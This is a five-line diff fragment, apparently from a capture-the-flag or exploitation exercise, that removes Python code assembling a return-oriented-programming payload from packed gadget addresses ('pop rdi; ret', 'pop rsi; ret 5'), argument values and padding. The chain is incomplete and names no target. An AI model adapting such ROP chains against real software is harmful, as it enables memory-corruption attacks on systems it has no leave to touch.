@@ -1,5 +1,0 @@
-payload = p64(0x4017d3)
-#0x00000000000017d3: pop rdi; ret; 
-payload += p64(0x100001)+p64(0x4336b9)
-# 0x00000000000336b9: pop rsi; ret 5; 
-payload += p64(0x100002)+p64(0x401331)+"\x00"*5
